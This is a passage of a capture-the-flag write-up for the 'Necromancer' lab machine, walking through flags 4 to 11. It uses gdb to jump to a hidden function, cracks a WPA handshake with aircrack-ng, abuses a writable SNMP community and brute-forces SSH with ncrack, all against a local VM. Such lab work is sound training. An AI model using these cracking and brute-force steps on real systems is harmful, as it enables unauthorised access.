   0x0804890d <+996>:	mov    BYTE PTR [ebp-0xc9],0xc8
   0x08048914 <+1003>:	mov    BYTE PTR [ebp-0xc8],0xc6
   0x0804891b <+1010>:	mov    BYTE PTR [ebp-0xc7],0x9f
   0x08048922 <+1017>:	mov    BYTE PTR [ebp-0xc6],0x5d
   0x08048929 <+1024>:	mov    BYTE PTR [ebp-0xc5],0xcf
   0x08048930 <+1031>:	mov    BYTE PTR [ebp-0xc4],0x8a
   0x08048937 <+1038>:	mov    BYTE PTR [ebp-0xc3],0xd2
   0x0804893e <+1045>:	mov    BYTE PTR [ebp-0xc2],0x1c
   0x08048945 <+1052>:	mov    BYTE PTR [ebp-0xc1],0xa1
   0x0804894c <+1059>:	mov    BYTE PTR [ebp-0x80],0xbf
   0x08048950 <+1063>:	mov    BYTE PTR [ebp-0x7f],0xbc
   0x08048954 <+1067>:	mov    BYTE PTR [ebp-0x7e],0x53
   0x08048958 <+1071>:	mov    BYTE PTR [ebp-0x7d],0xd5
   0x0804895c <+1075>:	mov    BYTE PTR [ebp-0x7c],0xdd
   0x08048960 <+1079>:	mov    BYTE PTR [ebp-0x7b],0x9b
   0x08048964 <+1083>:	mov    BYTE PTR [ebp-0x7a],0x52
   0x08048968 <+1087>:	mov    BYTE PTR [ebp-0x79],0xc6
   0x0804896c <+1091>:	mov    BYTE PTR [ebp-0x78],0x95
   0x08048970 <+1095>:	mov    BYTE PTR [ebp-0x77],0x9a
   0x08048974 <+1099>:	mov    BYTE PTR [ebp-0x76],0x5d
   0x08048978 <+1103>:	mov    BYTE PTR [ebp-0x75],0xd1
   0x0804897c <+1107>:	mov    BYTE PTR [ebp-0x74],0xc5
   0x08048980 <+1111>:	mov    BYTE PTR [ebp-0x73],0x97
   0x08048984 <+1115>:	mov    BYTE PTR [ebp-0x72],0x52
   0x08048988 <+1119>:	mov    BYTE PTR [ebp-0x71],0xd2
   0x0804898c <+1123>:	mov    BYTE PTR [ebp-0x70],0x9b
   0x08048990 <+1127>:	mov    BYTE PTR [ebp-0x6f],0xf8
   0x08048994 <+1131>:	mov    BYTE PTR [ebp-0x6e],0x36
   0x08048998 <+1135>:	mov    BYTE PTR [ebp-0x6d],0xab
   0x0804899c <+1139>:	mov    BYTE PTR [ebp-0x6c],0xbf
   0x080489a0 <+1143>:	mov    BYTE PTR [ebp-0x6b],0xf2
   0x080489a4 <+1147>:	sub    esp,0xc
   0x080489a7 <+1150>:	lea    eax,[ebp-0x1ac]
   0x080489ad <+1156>:	push   eax
   0x080489ae <+1157>:	call   0x80484f4 <myPrintf>
   0x080489b3 <+1162>:	add    esp,0x10
   0x080489b6 <+1165>:	sub    esp,0xc
   0x080489b9 <+1168>:	lea    eax,[ebp-0x1ac]
   0x080489bf <+1174>:	add    eax,0x64
   0x080489c2 <+1177>:	push   eax
   0x080489c3 <+1178>:	call   0x80484f4 <myPrintf>
   0x080489c8 <+1183>:	add    esp,0x10
   0x080489cb <+1186>:	sub    esp,0xc
   0x080489ce <+1189>:	lea    eax,[ebp-0x1ac]
   0x080489d4 <+1195>:	add    eax,0xc8
   0x080489d9 <+1200>:	push   eax
   0x080489da <+1201>:	call   0x80484f4 <myPrintf>
   0x080489df <+1206>:	add    esp,0x10
   0x080489e2 <+1209>:	sub    esp,0x8
   0x080489e5 <+1212>:	lea    eax,[ebp-0x1c]
   0x080489e8 <+1215>:	push   eax
   0x080489e9 <+1216>:	push   0x80495b0
   0x080489ee <+1221>:	call   0x8048330 <__isoc99_scanf@plt>
   0x080489f3 <+1226>:	add    esp,0x10
   0x080489f6 <+1229>:	sub    esp,0xc
   0x080489f9 <+1232>:	lea    eax,[ebp-0x1ac]
   0x080489ff <+1238>:	add    eax,0x12c
   0x08048a04 <+1243>:	push   eax
   0x08048a05 <+1244>:	call   0x80484f4 <myPrintf>
   0x08048a0a <+1249>:	add    esp,0x10
   0x08048a0d <+1252>:	nop
   0x08048a0e <+1253>:	mov    edi,DWORD PTR [ebp-0x4]
   0x08048a11 <+1256>:	leave  
   0x08048a12 <+1257>:	ret    
End of assembler dump.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini

(gdb) break main
Breakpoint 1 at 0x8048a21

(gdb) r
Starting program: /root/ctf/necromancer/talisman

Breakpoint 1, 0x08048a21 in main ()
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 10645) exited with code 0162]
```

If you are wondering what happened here let me tell you. I disassmbled the binary's main function, which calls `wearTalisman` which is where the text we say earlier is printed (apparently gdb does not recognize this as a string which blows up the size of the function) but otherwise it does nothing interesting. `info functions` however revealed that there is a function called `chantToBreakSpell` which is neither called in `main` nor in `wearTalisman`, so I called it myself by breaking at the start of the program and consequently jumping to said function.


### 5th Flag: Throwback time

The last flag came with sufficient instructions; we have to communicate with UDP port 31337 (aparently the Necromancer is fluent in leetspeak).

```
root@kali:~/ctf/necromancer# nmap -sU -p 31337 10.0.2.10

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 21:17 CET
Nmap scan report for 10.0.2.10
Host is up (0.00020s latency).

PORT      STATE SERVICE
31337/udp open  BackOrifice
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```

As expected the port is open and a service named BackOrifice sits behind it. I recognize the name from the early-mid 2000s, when me and a friend of mine used to experiment with it on LAN parties (without success due to seriously limited knowledge at that time). It's an oldschool backdoor trojan. In this case I don't expect it to be the real BackOrifice, since I only recall it running on Windows, not on BSD, the necromancer's operating system of choice. Enough talk, let's chant the words:

```
root@kali:~/ctf/necromancer# nc -u 10.0.2.10 31337
ea50536158db50247e110a6c89fcf3d3Nothing happens.
flag4{ea50536158db50247e110a6c89fcf3d3}Nothing happens.
```

The only answer is `Nothing happens`, we don't even get a newline. Like before on flag 2, I try the hash cracker again and receive the word `blackmagic`.

```
root@kali:~/ctf/necromancer# echo blackmagic | nc -u 10.0.2.10 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

Same solution as last time.

### 6th Flag: Resulting to brute force

What awaits us at `http://10.0.2.10/thenecromancerwillabsorbyoursoul` is too long for a screenshot, but see for yourself:

```
 flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
You continue to make your way through the cave.
In the distance you can see a familiar flicker of light moving in and out of the shadows.
As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.
You move closer, and then stop frozen with fear.
It's the necromancer!
```
{% asset_img "necromancer.jpg" "The Necromancer" %}
```
Again he stares at you with deathly hollow eyes.
He is standing in a doorway; a staff in one hand, and an object in the other.
Smirking, the necromancer holds the staff and the object in the air.
He points his staff in your direction, and the stench of death and decay begins to fill the air.
You stare into his eyes and then.......


...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.
The amulet must have saved you from whatever spell the necromancer had cast.
You stand to your feet. Behind you, only darkness.
Before you, a large door with the symbol of a skull engraved into the surface.
Looking closer at the skull, you can see u161 engraved into the forehead.
```

### 7th Flag: Ancient services

Spooky, but it seems we survived the encounter. In addition to the hint to UDP port 161 the necromancer links to the download of a binary file.

```
root@kali:~/ctf/necromancer# file necromancer
necromancer: bzip2 compressed data, block size = 900k
root@kali:~/ctf/necromancer# mv necromancer necromancer.bz2
root@kali:~/ctf/necromancer# bzip2 -d necromancer.bz2
root@kali:~/ctf/necromancer# ls
necromancer
root@kali:~/ctf/necromancer# file necromancer
necromancer: POSIX tar archive (GNU)
root@kali:~/ctf/necromancer# mv necromancer necromancer.tar
root@kali:~/ctf/necromancer# tar xvf necromancer.tar
necromancer.cap
```

It's a packet capture file which we can open with wireshark:

{% asset_img "pcap.png" "Packet Capture" %}

It looks like wireless lan traffic and probably includes a handshake. Maybe we can extract (i.e. crack) the password and use it on the open UDP port.

```
root@kali:~/ctf/necromancer# aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:06] 16128/9822768 keys tested (2439.42 k/s)

      Time left: 1 hour, 7 minutes, 0 seconds                    0.16%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E
```

Using the biggest password list on Kali we were able to crack the password `death2all`. Now we can focus on the port.

```
root@kali:~/ctf/necromancer# nmap -sU -p 161 10.0.2.10

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 22:54 CET
Nmap scan report for 10.0.2.10
Host is up (0.00019s latency).

PORT    STATE SERVICE
161/udp open  snmp
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

The service we find is SNMP. A little bit of research reveals that it is the Simple Network Management Protocol, often used by routers or switches. I also found out that Kali comes with a related software to extract information from such a service called `snmpwalk` (which was a little bit tricky to understand):

```
root@kali:~/ctf/necromancer# man snmpwalk
root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
End of MIB
```

So it's not that easy. At this point I almost gave up, as I did not understand SNMP well enough, but I guess it's sometimes necessary to dive deep into ancient protocols.

I guess the `snmp` equivalent of unlocking a door is setting the value of the "Locked..." string to something else. A specific value is probably needed so I read the `snmpwalk` output again and notice the unusual capitalization of "Unlocked", which also happens to be a plausible value for the string.

```
root@kali:~/ctf/necromancer# snmpset -c death2all -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string "Unlocked"
Error in packet.
Reason: (noSuchName) There is no such variable name in this MIB.
Failed object: iso.3.6.1.2.1.1.6.0
```

We probably do not have write access and by revisiting the previous output it is painfully obvious that the Necromancer has provided us with a community string that grants probably grants us this access (given that the `rw` in `death2allrw` stands for `read/write`). Let's try again:

```
root@kali:~/ctf/necromancer# snmpset -c death2allrw -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
End of MIB
```

### 8th Flag: Mounting the offensive

It worked! The answer points to `tcp/22` (SSH) which looks like we are about to get shell access on the Necromancer machine. However, we need a username and password first and there is not hint other than the port and the flag. We can try to milk the flag again by reversing the `md5` hash online again, a recurring theme of the Necromancer's flags. Doing so revealed that `demonslayer` was behind the hash. This does not look like a username/password combination, though. We can still try to use it as a username and crack the password. We use `hydra` for this, which would also allow us to use `demonslayer` as a password and brute force the user if the first approach does not work.

```
root@kali:~/ctf/necromancer# ncrack -p 22 --user demonslayer -P /usr/share/wordlists/rockyou.txt 10.0.2.10

Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-04-01 13:51 CEST
Stats: 0:00:14 elapsed; 0 services completed (1 total)
Rate: 43.67; Found: 1; About 0.00% done
(press 'p' to list discovered credentials)
Discovered credentials for ssh on 10.0.2.10 22/tcp:
10.0.2.10 22/tcp ssh: 'demonslayer' '12345678'
```

Almost instantly the password is discovered to be `12345678`, which we probably also would have been able to guess without `ncrack`. This password drops us right into demonslayer's korn shell (`ksh`) after an impressive MOTD:

```
root@kali:~/ctf/necromancer# ssh demonslayer@10.0.2.10
The authenticity of host '10.0.2.10 (10.0.2.10)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.2.10' (ECDSA) to the list of known hosts.
demonslayer@10.0.2.10's password:

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

$ echo $0
-ksh
$ ls
flag8.txt
$ cat flag8.txt
You enter the Necromancer's Lair!

A stench of decay fills this place.

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!"

Defend yourself!  Counter attack the Necromancer's spells at u777!
```

Well, just when I thought we were on the offensive we are forced to parry. We log out and check:

```
root@kali:~/ctf/necromancer# nmap -sU -p 777 10.0.2.10
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-01 13:59 CEST
Nmap scan report for 10.0.2.10
Host is up (0.00018s latency).

PORT    STATE         SERVICE
777/udp open|filtered multiling-http
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

root@kali:~/ctf/necromancer# netcat -ul -p 777

```

### Flags 8-10: An intense battle

UDP Port 777 is neither open on the Necromancer's machine nor are we contacted on said port. That means we will fight at the Necromancer own battlefield an log back in:

```
$ nc -O 30 -u localhost 777



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  Devil


** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.
```

### Last Flag: The strength to win

We survived due to the help of Wikipedia (I do admit that I failed this challenge at first, resulting in a complete reset of the Necromancer VM). The Necromancer is gone and the vile is our only hint.

```
$ ls -la
total 44
drwxr-xr-x  3 demonslayer  demonslayer  512 Sep 13 11:14 .
drwxr-xr-x  3 root         wheel        512 May 11  2016 ..
-rw-r--r--  1 demonslayer  demonslayer   87 May 11  2016 .Xdefaults
-rw-r--r--  1 demonslayer  demonslayer  773 May 11  2016 .cshrc
-rw-r--r--  1 demonslayer  demonslayer  103 May 11  2016 .cvsrc
-rw-r--r--  1 demonslayer  demonslayer  359 May 11  2016 .login
-rw-r--r--  1 demonslayer  demonslayer  175 May 11  2016 .mailrc
-rw-r--r--  1 demonslayer  demonslayer  218 May 11  2016 .profile
-rw-r--r--  1 demonslayer  demonslayer  196 Sep 13 11:02 .smallvile
drwx------  2 demonslayer  demonslayer  512 May 11  2016 .ssh
-rw-r--r--  1 demonslayer  demonslayer  706 May 11  2016 flag8.txt
$ cat .smallvile


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!
```

We can literally feel that we are oozing power. There is a certain desire to know how far our new gained powers go:

```
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

Yeah, we are mighty enough to see the next flag on the horizon.

```
$ sudo cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```


That's it, we have conquered the Necromancer. That took quite some time, but it was time well spent as a learning experience packaged in an unusual story.
